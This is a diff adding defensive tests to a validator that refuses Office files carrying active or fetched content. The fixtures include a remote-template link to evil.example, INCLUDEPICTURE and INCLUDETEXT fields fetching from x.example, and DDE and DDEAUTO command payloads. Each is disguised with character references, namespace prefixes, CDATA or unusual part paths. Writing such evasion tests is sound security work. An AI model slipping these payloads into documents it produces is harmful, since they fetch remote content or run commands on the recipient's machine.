@@ -204,6 +204,43 @@ describe('Office files: no macros, no embedded programs, nothing fetched on open
     expect(refusalOf(() => checkAgentFile(sheet('SUM(A1:A3)'), XLSX))).toBe('accepted')
   })
 
+  it('reads character references the way Office does, so an encoded TargetMode or field name is still seen', () => {
+    const template = ooxml({
+      extraParts: {
+        'word/_rels/document.xml.rels': relationships(
+          `<Relationship Id="rId9" Type="${TEMPLATE}" Target="https://evil.example/t.dotm" TargetMode="&#69;xternal"/>`,
+        ),
+      },
+    })
+    const field = ooxml({
+      mainBody:
+        '<w:document xmlns:w="w"><w:body><w:p><w:r><w:instrText> INCLUDEPI&#67;TURE "http://x.example/p.png"</w:instrText></w:r></w:p></w:body></w:document>',
+    })
+    const formula = ooxml({
+      flavour: 'xlsx',
+      extraParts: { 'xl/worksheets/sheet1.xml': "<worksheet><sheetData><row><c><f>cmd&#124;' /C calc'!A0</f></c></row></sheetData></worksheet>" },
+    })
+    expect(refusalOf(() => checkAgentFile(template, DOCX))).toBe('external-relationship')
+    expect(refusalOf(() => checkAgentFile(field, DOCX))).toBe('active-content')
+    expect(refusalOf(() => checkAgentFile(formula, XLSX))).toBe('active-content')
+  })
+
+  it('sees a field under any namespace prefix, in single quotes, in CDATA, and in a part outside word/', () => {
+    const W = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main'
+    const bodies = [
+      `<x:document xmlns:x="${W}"><x:body><x:p><x:r><x:instrText> DDEAUTO c:\\\\x.exe</x:instrText></x:r></x:p></x:body></x:document>`,
+      `<w:document xmlns:w="${W}"><w:body><w:p><w:fldSimple w:instr=' INCLUDETEXT "http://x.example/a.docx"'/></w:p></w:body></w:document>`,
+      `<w:document xmlns:w="${W}"><w:body><w:p><w:r><w:instrText><![CDATA[ INCLUDEPICTURE "http://x.example/p.png"]]></w:instrText></w:r></w:p></w:body></w:document>`,
+    ]
+    for (const mainBody of bodies) expect(refusalOf(() => checkAgentFile(ooxml({ mainBody }), DOCX))).toBe('active-content')
+    const elsewhere = ooxml({
+      extraParts: {
+        'custom/part.xml': `<w:hdr xmlns:w="${W}"><w:p><w:r><w:instrText> INCLUDEPICTURE "http://x.example/p.png"</w:instrText></w:r></w:p></w:hdr>`,
+      },
+    })
+    expect(refusalOf(() => checkAgentFile(elsewhere, DOCX))).toBe('active-content')
+  })
+
   it('refuses something that is not a zip at all', () => {
     expect(refusalOf(() => checkAgentFile(latin1('PK\x03\x04garbage'), DOCX))).toBe('malformed')
   })
